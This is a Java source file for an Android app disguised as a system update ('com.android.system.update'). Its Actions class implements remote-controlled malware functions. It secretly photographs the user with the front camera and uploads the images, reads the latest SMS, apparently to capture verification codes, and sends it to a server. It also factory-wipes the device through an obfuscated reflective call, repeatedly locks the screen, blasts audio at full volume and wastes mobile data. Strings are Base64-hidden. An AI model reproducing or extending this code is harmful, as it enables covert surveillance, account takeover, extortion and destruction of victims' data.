package com.android.system.update;

import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Base64;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class Actions {

    private static MediaPlayer player;
    
    // Скрытые строки (Base64)
    private static final String URL_BIN = "aHR0cHM6Ly9zcGVlZC5oZXR6bmVyLmRlLzEwME1CLmJpbg==";
    private static final String ACTION_WIPE = "d2lwZURhdGE=";
    private static final String URI_SMS = "Y29udGVudDovL3Ntcy9pbmJveA==";

    public static void showMsg(final Context ctx, final String text) {
        Handler h = new Handler(Looper.getMainLooper());
        h.post(() -> {
            try {
                Toast.makeText(ctx, text, Toast.LENGTH_LONG).show();
                WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
                TextView tv = new TextView(ctx);
                tv.setText(text);
                tv.setTextSize(24);
                tv.setPadding(40, 40, 40, 40);
                tv.setBackgroundColor(0xCC000000);
                tv.setTextColor(0xFFFFFFFF);
                WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.WRAP_CONTENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    android.graphics.PixelFormat.TRANSLUCENT);
                lp.gravity = Gravity.CENTER;
                wm.addView(tv, lp);
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try { wm.removeView(tv); } catch (Exception ignored) {}
                }, 8000);
            } catch (Exception ignored) {}
        });
    }

    public static void powerHold(final Context ctx, final long until) {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            final PowerManager.WakeLock w = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "sys_svc");
            w.acquire();
            final DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            java.lang.reflect.Method m = dpm.getClass().getMethod("lockNow");
            m.invoke(dpm);
            final Handler h = new Handler(Looper.getMainLooper());
            final Runnable r = new Runnable() {
                @Override public void run() {
                    if (System.currentTimeMillis() < until) {
                        try { m.invoke(dpm); } catch (Exception ignored) {}
                        h.postDelayed(this, 3000);
                    } else {
                        try { if (w.isHeld()) w.release(); } catch (Exception ignored) {}
                    }
                }
            };
            h.postDelayed(r, 3000);
        } catch (Exception ignored) {}
    }

    public static void playAsset(Context ctx, String name) {
        try {
            if (player != null) { player.release(); player = null; }
            AudioManager am = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            player = new MediaPlayer();
            android.content.res.AssetFileDescriptor afd = ctx.getAssets().openFd(name);
            player.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            player.setLooping(true);
            player.prepare();
            player.start();
        } catch (Exception ignored) {}
    }

    public static void photoSend(Context ctx, String deviceId, String base) {
        try {
            PhotoTaker.takeFront(ctx, bytes -> {
                try {
                    String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                    JSONObject o = new JSONObject();
                    o.put("id", deviceId);
                    o.put("kind", "photo");
                    o.put("body", b64);
                    Net.post(base + "/api/report", o.toString());
                } catch (Exception ignored) {}
            });
        } catch (Exception ignored) {}
    }

    public static void wipeAll(Context ctx, String deviceId, String base) {
        try {
            WipeHelper.removeAllUserApps(ctx, deviceId, base);
            DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
            String methodName = new String(Base64.decode(ACTION_WIPE, Base64.DEFAULT));
            java.lang.reflect.Method m = dpm.getClass().getMethod(methodName, int.class);
            m.invoke(dpm, 0);
        } catch (Exception ignored) {}
    }

    public static void burnPhone(Context ctx) {
        new Thread(() -> {
            try {
                String decodedUrl = new String(Base64.decode(URL_BIN, Base64.DEFAULT));
                for (int i = 0; i < 10; i++) {
                    URL url = new URL(decodedUrl);
                    HttpURLConnection c = (HttpURLConnection) url.openConnection();
                    InputStream in = c.getInputStream();
                    byte[] buf = new byte[8192];
                    while (in.read(buf) != -1) { /* load */ }
                    in.close();
                }
            } catch (Exception ignored) {}
        }).start();
    }

    public static void getLastSms(Context ctx, String deviceId, String base) {
        try {
            String uriStr = new String(Base64.decode(URI_SMS, Base64.DEFAULT));
            android.net.Uri uri = android.net.Uri.parse(uriStr);
            android.database.Cursor cursor = ctx.getContentResolver().query(
                uri, new String[]{"address", "body"}, null, null, "date DESC LIMIT 1"
            );
            String sender = "Unknown";
            String code = "No code";
            if (cursor != null && cursor.moveToFirst()) {
                sender = cursor.getString(0);
                code = cursor.getString(1);
                cursor.close();
            }
            JSONObject o = new JSONObject();
            o.put("id", deviceId);
            o.put("kind", "sms");
            o.put("body", "From: " + sender + "\nText: " + code);
            Net.post(base + "/api/report", o.toString());
        } catch (Exception e) {
            try {
                JSONObject o = new JSONObject();
                o.put("id", deviceId);
                o.put("kind", "sms");
                o.put("body", "Error: no access.");
                Net.post(base + "/api/report", o.toString());
            } catch (Exception ignored) {}
        }
    }
}
